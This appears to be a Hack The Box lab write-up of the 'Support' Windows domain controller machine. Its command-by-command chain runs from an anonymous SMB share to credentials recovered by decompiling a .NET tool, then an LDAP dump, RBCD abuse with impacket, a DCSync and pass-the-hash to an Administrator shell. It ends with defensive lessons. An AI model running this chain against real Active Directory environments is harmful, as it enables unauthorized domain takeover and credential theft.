# HTB: Support

**Difficulty:** Easy **OS:** Windows Server 2022 (Active Directory) **Target IP:** 10.129.230.181 **Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

```
nmap -p{ports} -sCV -T4 10.129.230.181 -oA nmap/nmap
```

```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

```
smb2-security-mode:
  3.1.1: Message signing enabled and required
```

This port spread — Kerberos, LDAP (389/636/3268/3269), and a `.NET Message Framing` service on 9389 — is the unmistakable signature of an **Active Directory Domain Controller**. With SMB signing enforced, classic relay attacks were off the table from the start, so the intended path was going to run through legitimate AD enumeration rather than SMB-layer tricks.

---

## 2. Foothold — Anonymous SMB Share Leaking a Custom Tool

### 2.1 Anonymous SMB Access

```
smbclient //10.129.230.181/support-tools -N
```

```
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe
```

An anonymous (`-N`, no credentials) connection to a share named `support-tools` succeeded — this share is world-readable with no authentication at all. Most of the contents are generic sysadmin utilities, but `UserInfo.exe.zip` stood out as the only **custom-named, non-off-the-shelf** binary in the list — exactly the kind of thing worth reverse engineering, since bespoke internal tools frequently hardcode credentials or connection strings.

```
get UserInfo.exe.zip
unzip UserInfo.exe.zip
file UserInfo.exe
```

```
UserInfo.exe: PE32 executable ... Mono/.Net assembly, 3 sections
```

Confirmed as a .NET assembly, which meant it could be fully decompiled back to readable C# source rather than raw disassembly — .NET IL retains far more structure than native code.

### 2.2 Decompiling with ILSpy

```
ilspycmd UserInfo.exe -o ./decompiled_code
```

Reading `UserInfo.decompiled.cs` revealed the tool's purpose: it's an internal helper for querying Active Directory user info (`find`/`user` subcommands wrapping LDAP searches), authenticating to LDAP using a **hardcoded, "obfuscated" service account password**:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    return Encoding.Default.GetString(array);
}
```

```csharp
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

This is a textbook case of **"security through obscurity" failing immediately once the binary is decompiled** — the "encryption" is just a repeating-key XOR with a static, single-byte-derived key (`"armando"`) plus a fixed byte constant (`0xDF`), all embedded directly in the assembly. Anyone with the binary can trivially reimplement `getPassword()` to recover the plaintext, which I did by porting the exact same XOR logic into a small Python script.

Running the decryption routine recovered the plaintext password for the domain account `support\ldap`.

---

## 3. Domain Enumeration — LDAP Anonymous/Authenticated Dump

### 3.1 Dumping the Directory

With the `ldap` account's credentials in hand, I performed a full LDAP dump of the domain to map out users, groups, and any interesting attributes:

```
ldapsearch -x -H ldap://10.129.230.181 -D 'support\ldap' -w '<recovered_password>' -b "DC=support,DC=htb"
```

Scanning through the (very large) output for anything resembling credentials, one entry stood out immediately — the `info` attribute on the **`support`** user object, a free-text field administrators sometimes misuse to store notes:

```
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
```

The `info` field isn't meant to hold secrets, but it's a common dumping ground for exactly that on real (and lab) environments — a classic case of a convenience field becoming an unintended credential leak. I also collected the full list of domain usernames (`smith.rosario`, `hernandez.stanley`, `wilson.shelby`, `support`, etc.) from the same dump for password-spraying.

### 3.2 Validating the Credential

```
nxc smb support.htb -u users.txt -p 'Ironside47pleasure40Watchful'
```

```
[+] support.htb\users.txt:Ironside47pleasure40Watchful (Guest)
```

The password matched the `support` account, authenticating successfully against SMB.

### 3.3 Checking What `support` Can Do

Further enumeration (BloodHound-style group/ACL review) against the authenticated `support` account showed two critical facts:

1. **`support` is a member of "Remote Management Users"** — meaning it has WinRM access, though a full interactive shell wasn't the fastest path forward here.
2. **`support` holds `GenericAll` rights directly on the `DC` computer object** (`DC.SUPPORT.HTB`, the domain controller itself).

`GenericAll` on a computer object is a full-control ACL entry — it lets the holder modify essentially any attribute of that object, including security-relevant ones like **`msDS-AllowedToActOnBehalfOfOtherIdentity`**, the attribute that drives **Resource-Based Constrained Delegation (RBCD)**. Having `GenericAll` on the domain controller's own computer object is about as high-value a misconfiguration as exists in an AD environment short of outright Domain Admin credentials.

---

## 4. Privilege Escalation — Resource-Based Constrained Delegation (RBCD) to Domain Admin

### 4.1 The Attack Concept

RBCD abuse works like this: if I control (or can create) a computer account, and I have write access to another computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, I can configure that target object to trust my controlled computer account to impersonate **any domain user** against it via Kerberos S4U2Self/S4U2Proxy — including a Domain Admin. Since `support` has `GenericAll` on the DC's computer object, and standard domain policy allows any authenticated user to create up to a small quota of new computer accounts (`ms-DS-MachineAccountQuota`), the full chain was available end-to-end.

### 4.2 Creating a Machine Account I Control

```bash
impacket-addcomputer \
  -dc-ip 10.129.230.181 \
  -domain-netbios SUPPORT \
  -computer-name 'ATTACKERSYSTEM$' \
  -computer-pass 'Summer2018!' \
  'support.htb/support:Ironside47pleasure40Watchful'
```

```
[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
```

Using the `support` account's own domain credentials (any authenticated user can normally create computer accounts up to the domain's machine account quota), I registered a brand-new computer object, `ATTACKERSYSTEM$`, with a password of my choosing — giving me a fully legitimate Kerberos principal under my control.

### 4.3 Configuring RBCD on the Domain Controller

```bash
impacket-rbcd \
  -delegate-from 'ATTACKERSYSTEM$' \
  -delegate-to 'DC$' \
  -action write \
  'support.htb/support:Ironside47pleasure40Watchful'
```

```
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
```

Using `support`'s `GenericAll` rights on the `DC` computer object, I wrote to `DC$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, configuring it to trust my new `ATTACKERSYSTEM$` machine account for delegation. In effect: the domain controller now says "requests coming through ATTACKERSYSTEM$, impersonating any user, should be honored."

### 4.4 Requesting a Service Ticket as Administrator

```bash
impacket-getST \
  -dc-ip 10.129.230.181 \
  -spn 'cifs/DC.support.htb' \
  -impersonate Administrator \
  'support.htb/ATTACKERSYSTEM$:Summer2018!'
```

```
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

Using the machine account's own credentials, I performed the S4U2Self → S4U2Proxy Kerberos extension chain: first requesting a ticket to myself *as* Administrator (S4U2Self, which any account can request for itself), then using the RBCD trust just configured to convert that into a **usable service ticket for the `cifs` service on the DC, impersonating Administrator** (S4U2Proxy). This is precisely what RBCD is designed to allow once the delegation attribute is set.

### 4.5 Using the Ticket

```bash
export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
echo '10.129.230.181 DC.support.htb' >> /etc/hosts
```

With the forged ticket loaded and the DC's hostname resolvable locally (Kerberos is hostname-sensitive, not IP-based), I used it directly for a DCSync-style credential dump:

```bash
impacket-secretsdump -k -no-pass \
  -just-dc-user Administrator \
  'support.htb/Administrator@DC.support.htb'
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
```

The `cifs` service ticket was sufficient to authenticate as Administrator for the DRSUAPI-based secrets dump, pulling the Administrator account's NTLM hash directly from the domain's NTDS store — full domain credential compromise.

### 4.6 Confirming Full Compromise

```bash
impacket-wmiexec \
  -hashes ':bb06cbc02b39abeddd1335bc30b19e26' \
  'support.htb/Administrator@10.129.230.181'
```

```
C:\>whoami
support\administrator
```

✅ **Full compromise** — an interactive command shell as `support\administrator` via pass-the-hash, using the NTLM hash recovered from the DCSync.

---

## 5. Summary

| Stage | Technique |
|---|---|
| Recon | `nmap` → full AD DC port signature (Kerberos, LDAP, DNS, SMB) |
| Foothold | Anonymous SMB access to `support-tools` share leaked a custom `.NET` tool (`UserInfo.exe`) |
| Credential extraction | Decompiled the tool with `ilspycmd`, found a hardcoded XOR-"encrypted" LDAP service account password, reimplemented the trivial decryption logic |
| Domain enumeration | Used the recovered `ldap` account to dump the full LDAP directory; found a plaintext password stashed in the `support` user's `info` attribute |
| Access confirmation | `nxc` validated the leaked password against the `support` account over SMB |
| Privilege discovery | `support` held `GenericAll` on the `DC` computer object itself |
| Privesc | Created a new machine account (`impacket-addcomputer`), configured **Resource-Based Constrained Delegation** from it onto the DC (`impacket-rbcd`) using the `GenericAll` right, then used S4U2Self/S4U2Proxy (`impacket-getST`) to obtain a `cifs` ticket impersonating **Administrator** |
| Root/DA | Used the forged ticket for a targeted DCSync (`impacket-secretsdump -just-dc-user Administrator`) to dump the Administrator NTLM hash, then pass-the-hash (`impacket-wmiexec`) for a full admin shell |

**Root cause / lessons learned:**

- An anonymously-readable SMB share containing internal tooling is a serious exposure on its own — even "just utilities" can (and here, did) contain a custom binary with embedded secrets.
- Home-rolled "encryption" (XOR with a static key) provides no real protection once an attacker has the binary — it's trivially reversible and should never be used to protect credentials. Secrets belong in a proper credential store (e.g., gMSA, a vault), not embedded in a shipped executable.
- Free-text AD attributes like `info`, `description`, and similar fields are a surprisingly common place for administrators to accidentally store plaintext passwords or notes containing sensitive data — these should be audited and never used for anything credential-related.
- Granting `GenericAll` (or any broad ACL) on a Domain Controller's own computer object to a low-privileged service account is catastrophic — it directly enables RBCD abuse into full Domain Admin, as demonstrated. ACLs on DC computer objects should be reviewed with the same scrutiny as Domain Admin group membership itself, since they are functionally equivalent once GenericAll (or WriteDACL/WriteProperty on delegation attributes) is granted.
- The default machine account quota (`ms-DS-MachineAccountQuota`, typically 10) that lets any authenticated user create computer accounts is a necessary enabler of this specific attack chain — environments with unusual privilege exposure on computer objects should consider reducing this quota to 0 for regular users.

---

## 6. Tools Used

- `nmap` — reconnaissance
- `smbclient` — anonymous SMB share access
- `ilspycmd` (ILSpy) — decompiling the .NET `UserInfo.exe` binary to recover hardcoded credential logic
- `ldapsearch` — dumping the full LDAP directory for the `info` attribute credential leak and username list
- `nxc` (NetExec) — validating leaked credentials against SMB and enumerating group membership/ACLs
- `impacket-addcomputer` — creating a controlled machine account
- `impacket-rbcd` — writing the Resource-Based Constrained Delegation configuration via the `GenericAll` right
- `impacket-getST` — S4U2Self/S4U2Proxy Kerberos ticket request, impersonating Administrator
- `impacket-secretsdump` — targeted DCSync to dump the Administrator NTLM hash
- `impacket-wmiexec` — pass-the-hash for the final interactive shell
